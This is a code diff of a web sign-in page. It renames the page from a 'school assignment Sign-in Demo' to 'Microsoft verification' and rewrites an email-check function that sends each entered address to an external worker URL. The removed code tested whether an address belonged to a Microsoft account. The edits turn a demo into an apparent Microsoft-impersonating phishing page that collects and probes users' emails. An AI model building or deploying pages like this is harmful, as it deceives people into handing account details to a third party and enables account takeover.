@@ -1,10 +1,10 @@
-<!doctype html>
+ <!doctype html>
 
 <html lang="en">
 <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
- <title>school assignment Sign-in Demo</title>
+ <title>Microsoft verification</title>
  <style>
  :root {
  color-scheme: light;
@@ -519,40 +519,57 @@
 
  return tracking;
  }
+async function verifyEmail(email) {
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    return {
+      success: false,
+      message: "Invalid email format."
+    };
+  }
 
+  try {
+    const response = await fetch(WORKER_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ email })
+    });
+
+    const data = await response.json();
+
+    if (!response.ok || data.success !== true) {
+      return {
+        success: false,
+        message: data.error || "Verification service error."
+      };
+    }
+
+    if (!data.verification) {
+      return {
+        success: false,
+        message: "Invalid response from verification service."
+      };
+    }
+
+    return {
+      success: true,
+      email: data.email,
+      verification: data.verification,
+      accountRegistration: "not_checked"
+    };
+
+  } catch (error) {
+    console.error("Worker verification error:", error);
+
+    return {
+      success: false,
+      message: "Unable to contact verification service."
+    };
+  }
+}
  // --- VERIFICATION LOGIC ---
- async function verifyEmail(email) {
- if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
- return { success: false, message: "Invalid email format." };
- }
-
- try {
- const response = await fetch(WORKER_URL, {
- method: "POST",
- headers: { "Content-Type": "application/json" },
- body: JSON.stringify({ email })
- });
-
- const data = await response.json();
-
- if (!response.ok || data.success !== true) {
- return { success: false, message: "Verification service error." };
- }
-
- if (typeof data.is_registered !== "boolean") {
- return { success: false, message: "Unknown result from verifier." };
- }
-
- if (data.is_registered) {
- return { success: true };
- } else {
- return { success: false, message: "Not a Microsoft account." };
- }
-
- } catch (error) {
- return { success: false, message: "Network error during verification." };
- }
- }
+  
 
  // STEP 1: Email Submission
  document.getElementById("email-form").addEventListener("submit", async (event) => {
